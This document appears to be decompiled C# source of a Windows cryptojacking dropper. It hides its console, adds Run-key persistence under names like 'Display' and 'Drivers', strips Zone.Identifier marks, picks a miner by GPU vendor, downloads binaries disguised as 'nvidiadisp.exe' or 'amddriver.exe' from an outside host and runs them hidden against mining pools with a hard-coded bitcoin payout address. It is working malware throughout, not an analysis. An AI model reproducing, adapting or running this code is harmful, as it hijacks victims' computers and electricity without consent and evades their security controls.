using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

internal class Class0
{
	public class Class1
	{
		public static volatile string string_0;

		public static volatile string string_1;

		public static volatile string string_2;

		public static volatile string string_3;

		public void method_0()
		{
			Thread.Sleep(0);
			int num = 0;
			if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "md64/taskstart.exe")))
			{
				string_3 = "md64.exe";
				string_1 = "md64";
				string_2 = "taskstart";
				string_0 = " -a X11 -o stratum+tcp://useast.wafflepool.com:3331 -u 1GcDaNXwpvd7kuPCicWUEXjKbBkp61WVnh -p d=0.01";
			}
			else if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "nvidiadisp/nvidiadisp.exe")))
			{
				string_3 = "nvidiadisp.exe";
				string_1 = "nvidiadisp";
				string_2 = "nvidiadisp";
				string_0 = " -q -o stratum+tcp://useast.wafflepool.com:3331 -u 1GcDaNXwpvd7kuPCicWUEXjKbBkp61WVnh -p d=0.01 --algo=x11";
			}
			else if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "amddriver/amddriver.exe")))
			{
				string_3 = "amddriver.exe";
				string_1 = "amddriver";
				string_2 = "amddriver";
				string_0 = " -o stratum+tcp://useast.wafflepool.com:3331 -u 1GcDaNXwpvd7kuPCicWUEXjKbBkp61WVnh -p d=0.01 --kernel=x11mod";
			}
			else if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "md32/taskstart.exe")))
			{
				string_3 = "md32.exe";
				string_1 = "md32";
				string_2 = "taskstart";
				string_0 = " -a scrypt -o stratum+tcp://useast.wafflepool.com:3333 -u 1GcDaNXwpvd7kuPCicWUEXjKbBkp61WVnh -p d=256";
			}
			while (num < 100)
			{
				Process[] processesByName = Process.GetProcessesByName(string_2);
				if (processesByName.Length > 0)
				{
					Thread.Sleep(100);
				}
				else if (processesByName.Length == 0 && File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), string_7 + "/" + string_1 + "/" + string_2 + ".exe")))
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.CreateNoWindow = false;
					processStartInfo.UseShellExecute = true;
					processStartInfo.FileName = string_7 + "/" + string_1 + "/" + string_2 + ".exe";
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.Arguments = string_0;
					num++;
					try
					{
						using Process process = Process.Start(processStartInfo);
						process.WaitForExit();
					}
					catch (Exception ex)
					{
						Console.WriteLine(ex.Message);
					}
				}
				else if (processesByName.Length == 0 && !File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), string_7 + "/" + string_1 + "/" + string_2 + ".exe")))
				{
					try
					{
						smethod_0(string_3);
					}
					catch
					{
						Console.WriteLine("Failed Method Call to dL");
					}
				}
			}
		}
	}

	private const int int_0 = 9;

	private const int int_1 = 0;

	public static volatile int int_2 = 0;

	public static volatile string string_0;

	public static volatile string string_1;

	public static volatile string string_2;

	public static volatile string string_3;

	public static volatile string string_4 = "NVIDIA";

	public static volatile string string_5 = "AMD";

	public static volatile string string_6 = "Intel";

	public static volatile string string_7 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static Mutex mutex_0;

	private static void Main(string[] args)
	{
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		IntPtr consoleWindow = GetConsoleWindow();
		ShowWindow(consoleWindow, 0);
		smethod_1();
		if (!smethod_3())
		{
			return;
		}
		smethod_1();
		Class1 @object = new Class1();
		Thread thread = new Thread(@object.method_0);
		ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController");
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				PropertyData val3 = ((ManagementBaseObject)val2).get_Properties().get_Item("CurrentBitsPerPixel");
				PropertyData val4 = ((ManagementBaseObject)val2).get_Properties().get_Item("Description");
				if (val3 == null || val4 == null || val3.get_Value() == null)
				{
					continue;
				}
				object propertyValue = ((ManagementBaseObject)val2).GetPropertyValue("Description");
				if (propertyValue.ToString()!.Contains(string_4))
				{
					if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "nvidiadisp/nvidiadisp.exe")))
					{
						Console.Write("GPU File Exists");
						string_1 = "nvidiadisp";
						string_2 = "nvidiadisp.exe";
						string_3 = "nvidiadisp.exe";
						string_0 = "nvidiadisp";
						thread.Start();
					}
					else
					{
						string_1 = "nvidiadisp";
						string_2 = "nvidiadisp.exe";
						string_3 = "nvidiadisp.exe";
						string_0 = "nvidiadisp";
						smethod_0(string_2);
						thread.Start();
					}
				}
				else if (propertyValue.ToString()!.Contains(string_5))
				{
					if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "amddriver/amddriver.exe")))
					{
						Console.Write("GPU File Exists");
						string_1 = "amddriver";
						string_2 = "amddriver.exe";
						string_3 = "amddriver.exe";
						string_0 = "amddriver";
						thread.Start();
					}
					else
					{
						string_1 = "amddriver";
						string_2 = "amddriver.exe";
						string_3 = "amddriver.exe";
						string_0 = "amddriver";
						smethod_0(string_2);
						thread.Start();
					}
				}
				else if (!File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "md64/taskstart.exe")) && !File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "md32/taskstart.exe")))
				{
					if (!(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE") == "AMD64") && !(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE") == "x64") && !(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE") == "Intel 64"))
					{
						string_1 = "md32";
						string_2 = "md32.exe";
						string_3 = "taskstart.exe";
						string_0 = "taskstart";
						smethod_0(string_2);
						thread.Start();
					}
					else
					{
						string_1 = "md64";
						string_2 = "md64.exe";
						string_3 = "taskstart.exe";
						string_0 = "taskstart";
						smethod_0("md64.exe");
						thread.Start();
					}
				}
				else
				{
					Console.Write("CPU File Exists");
					string_3 = "taskstart.exe";
					string_0 = "taskstart";
					thread.Start();
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static void smethod_0(string string_8)
	{
		WebClient webClient = new WebClient();
		FileInfo fileInfo = new FileInfo(string_8);
		webClient.DownloadFile("http://gamecomp.net/" + fileInfo.Name, fileInfo.FullName);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.CreateNoWindow = false;
		processStartInfo.UseShellExecute = false;
		processStartInfo.FileName = fileInfo.Name;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		int num = 0;
		while (smethod_2(fileInfo))
		{
			try
			{
				if (num == 0)
				{
					Thread.Sleep(7500);
					continue;
				}
				return;
			}
			catch
			{
				Console.WriteLine("Failed File Lock Test");
				return;
			}
		}
		try
		{
			using Process process = Process.Start(processStartInfo);
			process.WaitForExit();
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public static void smethod_1()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		FileSystemInfo fileSystemInfo = new FileInfo(location);
		string name = fileSystemInfo.Name;
		string location2 = Assembly.GetExecutingAssembly().Location;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		folderPath = Path.Combine(folderPath, name);
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		try
		{
			registryKey.SetValue("Display", Application.get_ExecutablePath().ToString());
			registryKey.SetValue("Drivers", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + name);
		}
		catch
		{
			Console.WriteLine("Failed to Add Startup.");
		}
		try
		{
			smethod_5(Application.get_ExecutablePath().ToString());
			smethod_5(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + name);
		}
		catch
		{
			Console.WriteLine("Failed to Configure Zones.");
		}
		try
		{
			File.Copy(location2, folderPath, overwrite: false);
			location2 = folderPath;
		}
		catch
		{
			Console.WriteLine("No authorization to copy file or file exists already.");
		}
	}

	protected static bool smethod_2(FileInfo fileInfo_0)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = fileInfo_0.Open(FileMode.Open, FileAccess.Read, FileShare.None);
		}
		catch (IOException)
		{
			return true;
		}
		finally
		{
			fileStream?.Close();
		}
		return false;
	}

	public static bool smethod_3()
	{
		if (smethod_4())
		{
			return false;
		}
		return true;
	}

	private static bool smethod_4()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		FileSystemInfo fileSystemInfo = new FileInfo(location);
		string name = fileSystemInfo.Name;
		mutex_0 = new Mutex(initiallyOwned: true, "Global\\" + name, out var createdNew);
		if (createdNew)
		{
			mutex_0.ReleaseMutex();
		}
		return !createdNew;
	}

	public static bool smethod_5(string string_8)
	{
		return DeleteFile(string_8 + ":Zone.Identifier");
	}

	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DeleteFile(string string_8);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr intptr_0, int int_3);
}
